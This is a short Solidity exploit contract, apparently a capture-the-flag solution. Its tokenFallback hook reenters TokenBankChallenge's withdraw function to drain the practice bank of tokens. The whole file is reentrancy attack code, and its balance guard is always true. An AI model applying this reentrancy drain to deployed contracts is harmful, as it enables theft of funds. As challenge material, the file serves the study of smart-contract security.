pragma solidity ^0.4.21;
import "../TokenBankChallenge.sol";

contract BankAttack {
    TokenBankChallenge victim;
    uint256 public myBalance;

    function setVictimAddress(address victimAddress) public {
        victim = TokenBankChallenge(victimAddress);
    }

    function tokenFallback(
        address from,
        uint256 value,
        bytes
    ) external {
        if (victim.token().balanceOf(victim) >= 0) {
            victim.withdraw(500000);
            myBalance = value;
        }
    }
}
